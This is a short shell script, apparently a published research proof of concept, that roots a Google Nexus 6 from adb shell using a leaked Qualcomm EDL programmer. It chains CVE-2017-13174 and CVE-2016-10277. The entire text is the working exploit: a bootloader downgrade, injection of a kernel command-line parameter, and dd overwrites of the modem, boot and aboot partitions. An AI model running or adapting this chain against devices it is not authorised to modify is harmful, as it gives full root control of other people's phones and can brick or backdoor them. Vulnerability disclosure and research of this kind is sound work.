#!/bin/sh -x

#
# By Roee Hay, Aleph Research
#
# adb shell -> root exploit for Google Nexus 6 using a leaked Qualcomm Emergency Download (EDL) Mode programmer
#
# Exploits CVE-2017-13174 to downgrade ABOOT to a CVE-2016-10277 (initroot) susceptible version.
#

adb wait-for-device shell getprop ro.build.fingerprint
adb shell id
adb reboot edl
sudo ./edl/qboot blank-flash ./edl/programmer.mbn ./edl/singleimage.bin
fastboot oem device-info
fastboot getvar version-bootloader
fastboot flash partition img/gpt.bin
fastboot flash aboot img/bootloader.aboot-n6f26y.img
fastboot reboot-bootloader
fastboot getvar version-bootloader
fastboot oem config fsg-id "a initrd=0x11000000,1519997"
fastboot flash aleph ./img/initroot-shamu-aosp-nmf26f.cpio.gz
fastboot continue
adb wait-for-device
adb push ./img/*.img /data/local/tmp
adb shell dd of=/dev/block/platform/msm_sdcc.1/by-name/modem if=/data/local/tmp/radio.modem-n6f27e.img
adb shell dd of=/dev/block/platform/msm_sdcc.1/by-name/boot if=/data/local/tmp/initroot-shamu-aosp-nmf26f.img
adb shell dd of=/dev/block/platform/msm_sdcc.1/by-name/aboot if=/data/local/tmp/bootloader.aboot-n6f27e.img
adb shell dd of=/dev/block/platform/msm_sdcc.1/by-name/abootBackup if=/data/local/tmp/bootloader.aboot-n6f27e.img
adb shell rm -fr /data/local/tmp/*.img
adb reboot bootloader
fastboot getvar version-bootloader
fastboot oem config fsg-id ""
fastboot continue
adb wait-for-device shell getprop ro.build.fingerprint
adb shell id
adb shell

